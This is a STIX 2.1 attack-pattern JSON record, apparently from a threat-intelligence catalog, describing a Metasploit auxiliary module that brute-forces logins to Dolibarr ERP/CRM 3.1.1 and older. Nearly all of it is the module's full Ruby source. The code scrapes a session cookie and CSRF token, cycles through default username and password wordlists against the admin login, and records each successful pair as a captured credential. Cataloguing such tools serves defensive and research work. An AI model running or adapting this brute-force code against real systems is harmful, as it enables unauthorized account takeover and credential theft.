{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4dcde2c6-202e-45a1-9598-9211b11e15f5",
    "created": "2024-08-14T16:31:12.133442Z",
    "modified": "2024-08-14T16:31:12.133447Z",
    "name": "Dolibarr ERP/CRM Login Utility",
    "description": " This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface and should only work against version 3.1.1 or older, because these versions do not have any default protections against brute forcing. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/dolibarr_login.rb",
            "external_id": "dolibarr_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Dolibarr ERP/CRM Login Utility',\n      'Description'    => %q{\n        This module attempts to authenticate to a Dolibarr ERP/CRM's admin web interface,\n        and should only work against version 3.1.1 or older, because these versions do not\n        have any default protections against brute forcing.\n      },\n      'Author'         => [ 'sinn3r' ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        OptPath.new('USERPASS_FILE',  [ false, \"File containing users and passwords separated by space, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_userpass.txt\") ]),\n        OptPath.new('USER_FILE',  [ false, \"File containing users, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_users.txt\") ]),\n        OptPath.new('PASS_FILE',  [ false, \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\") ]),\n        OptString.new('TARGETURI', [true, 'The URI path to dolibarr', '/dolibarr/'])\n      ])\n  end\n\n\n  def get_sid_token\n    res = send_request_raw({\n      'method' => 'GET',\n      'uri'    => normalize_uri(@uri)\n    })\n\n    return [nil, nil] if res.nil? || res.get_cookies.empty?\n\n    # Get the session ID from the cookie\n    m = res.get_cookies.match(/(DOLSESSID_.+);/)\n    id = (m.nil?) ? nil : m[1]\n\n    # Get the token from the decompressed HTTP body response\n    m = res.body.match(/type=\"hidden\" name=\"token\" value=\"(.+)\"/)\n    token = (m.nil?) ? nil : m[1]\n\n    return id, token\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user, pass)\n    #\n    # Get a new session ID/token.  That way if we get a successful login,\n    # we won't get a false positive due to reusing the same sid/token.\n    #\n    sid, token = get_sid_token\n    if sid.nil? or token.nil?\n      vprint_error(\"Unable to obtain session ID or token, cannot continue\")\n      return :abort\n    else\n      vprint_status(\"Using sessiond ID: #{sid}\")\n      vprint_status(\"Using token: #{token}\")\n    end\n\n    begin\n      res = send_request_cgi({\n        'method'   => 'POST',\n        'uri'      => normalize_uri(\"#{@uri}index.php\"),\n        'cookie'   => sid,\n        'vars_post' => {\n          'token'         => token,\n          'loginfunction' => 'loginfunction',\n          'tz'            => '-6',\n          'dst'           => '1',\n          'screenwidth'   => '1093',\n          'screenheight'  => '842',\n          'username'      => user,\n          'password'      => pass\n        }\n      })\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      vprint_error(\"Service failed to respond\")\n      return :abort\n    end\n\n    if res.nil?\n      vprint_error(\"Connection timed out\")\n      return :abort\n    end\n\n    location = res.headers['Location']\n    if res and res.headers and (location = res.headers['Location']) and location =~ /admin\\//\n      print_good(\"Successful login: \\\"#{user}:#{pass}\\\"\")\n      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.headers['Location'])\n      return :next_user\n    else\n      vprint_error(\"Bad login: \\\"#{user}:#{pass}\\\"\")\n      return\n    end\n  end\n\n  def run\n    @uri = target_uri.path\n    @uri << \"/\" if @uri[-1, 1] != \"/\"\n\n    super\n  end\n\n  def run_host(ip)\n    each_user_pass { |user, pass|\n      vprint_status(\"Trying \\\"#{user}:#{pass}\\\"\")\n      do_login(user, pass)\n    }\n  end\nend\n"
}